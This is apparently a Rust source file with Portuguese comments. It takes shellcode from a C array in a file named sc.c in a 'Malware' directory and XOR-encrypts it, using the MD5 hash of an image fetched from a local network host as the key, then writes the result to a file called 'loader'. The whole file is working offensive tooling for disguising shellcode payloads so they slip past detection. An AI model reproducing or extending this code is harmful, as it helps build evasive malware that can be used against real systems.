use std::fs::File;
use std::io::{BufRead, BufReader, Write};
use std::path::Path;
use std::error::Error;
use reqwest::blocking::get;
use md5;

fn main() -> Result<(), Box<dyn Error>> {
    // URL da imagem
    let image_url = "http://192.168.20.27:8090/imagem.jpg";
    // Caminho para o arquivo de entrada
    let input_path = Path::new("/home/javarez/Documentos/Malware/sc.c");
    // Caminho para o arquivo de saída
    let output_path = Path::new("/home/javarez/Documentos/Malware/loader");

    // Baixar a imagem e calcular o hash MD5
    let xor_key = download_and_calculate_md5(image_url)?;
    
    let xor_key_hex: String = xor_key.iter().map(|b| format!("{:02x}", b)).collect();
    println!("Chave XOR (MD5): {}", xor_key_hex);

    // Ler o conteúdo do arquivo de entrada
    let contents = read_hex_from_file(&input_path)?;
    println!("Conteúdo lido do arquivo de entrada: {}", contents);

    // Converta a string de formato hexadecimal para bytes reais
    let bytes = hex_to_bytes(&contents)?;
    println!("Bytes convertidos do conteúdo: {:?}", bytes);

    // Execute a operação XOR em cada byte usando a chave MD5
    let xor_bytes: Vec<u8> = bytes.iter().zip(xor_key.iter().cycle()).map(|(&b, &k)| b ^ k).collect();
    println!("Bytes após operação XOR: {:?}", xor_bytes);

    // Escreva os bytes modificados no arquivo de saída
    let mut output_file = File::create(&output_path)?;
    output_file.write_all(&xor_bytes)?;
    println!("Operação XOR concluída e arquivo salvo em {:?}", output_path);

    Ok(())
}

fn download_and_calculate_md5(url: &str) -> Result<[u8; 16], Box<dyn Error>> {
    // Baixar a imagem
    let response = get(url)?;
    let bytes = response.bytes()?;

    // Calcular o hash MD5
    let digest = md5::compute(&bytes);
    let mut key = [0u8; 16];
    key.copy_from_slice(&digest.0);

    Ok(key)
}

fn read_hex_from_file(path: &Path) -> Result<String, Box<dyn Error>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);

    let mut hex_string = String::new();
    let mut start_parsing = false;

    for line in reader.lines() {
        let line = line?;
        if start_parsing {
            hex_string.push_str(&line);
            if line.ends_with("};") || line.ends_with("\";") {
                break;
            }
        }
        if line.starts_with("unsigned char buf[] = {") {
            start_parsing = true;
            hex_string.push_str(&line["unsigned char buf[] = {".len()..]);
        } else if line.starts_with("unsigned char buf[] = \"") {
            start_parsing = true;
            hex_string.push_str(&line["unsigned char buf[] = \"".len()..]);
        }
    }

    // Imprimir estado intermediário para depuração
    println!("Hex string after initial parsing: {}", hex_string);

    // Remover prefixos, sufixos e espaços desnecessários
    hex_string = hex_string
        .replace("0x", "")
        .replace("\\x", "")
        .replace(",", "")
        .replace(" ", "")
        .replace("{", "")
        .replace("}", "")
        .replace("\n", "")
        .replace("\r", "")
        .replace("\";", "")
        .replace(";", "")
        .replace("\"", "");

    // Imprimir estado final para depuração
    println!("Hex string after cleanup: {}", hex_string);

    // Verificar se o comprimento é par
    if hex_string.len() % 2 != 0 {
        return Err("Hex string length should be even".into());
    }

    Ok(hex_string)
}

fn hex_to_bytes(hex: &str) -> Result<Vec<u8>, Box<dyn Error>> {
    (0..hex.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).map_err(|e| e.into()))
        .collect()
}
